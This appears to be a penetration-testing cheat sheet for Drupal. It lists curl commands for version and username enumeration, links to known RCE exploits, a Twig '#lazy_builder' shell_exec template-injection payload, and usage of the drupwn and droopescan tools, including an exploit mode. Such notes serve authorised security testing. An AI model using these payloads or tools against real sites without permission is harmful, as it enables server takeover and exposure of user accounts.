# 💧 Drupal

## Manual

```bash
# check meta
curl https://www.drupal.org/ | grep 'content="Drupal'
# version
curl https://drupal-site.com/CHANGELOG.txt
# node
curl drupal-site.com/node/1

# users
# 403 -> exists | 404 -> doesn"t
curl https://www.drupal.org/user/X
# get username
curl https://www.drupal.org/reset/user/X/1/1
```

### Exploits

### Drupal < 8.7.x Authenticated RCE module upload

{% embed url="https://www.drupal.org/project/drupal/issues/3093274" %}

{% embed url="https://www.drupal.org/files/issues/2019-11-08/drupal_rce.tar_.gz" %}

#### Drupal < 9.1.x Authenticated RCE Twig templates

{% embed url="https://www.drupal.org/project/drupal/issues/2860607" %}

"Administer views" -> new View of User Fields -> Add a "Custom text" :

```java
"{{ {"#lazy_builder": ["shell_exec", ["touch /tmp/hellofromviews"]]} }}"
```

#### If found /node/$NUMBER, the number could be devs or tests pages

#### Drupal < 8.6.9 - REST Module Remote Code Execution

{% embed url="https://www.exploit-db.com/exploits/46459" %}

### Check for username disclosure on old versions:

> ?q=admin/views/ajax/autocomplete/user/a

## Tools

### Drupwn

> Enumeration & Exploitation

{% embed url="https://github.com/immunIT/drupwn" %}

```bash
# install
git clone https://github.com/immunIT/drupwn.git
cd drupwn
pip3 install -r requirements.txt

# enum
drupwn --mode enum --target $url

# exploit
drupwn --mode exploit --target $url
```

### droopescan

{% embed url="https://github.com/SamJoan/droopescan" %}

```bash
apt-get install python-pip
pip install droopescan

# scan
 droopescan scan drupal -u example.org
```
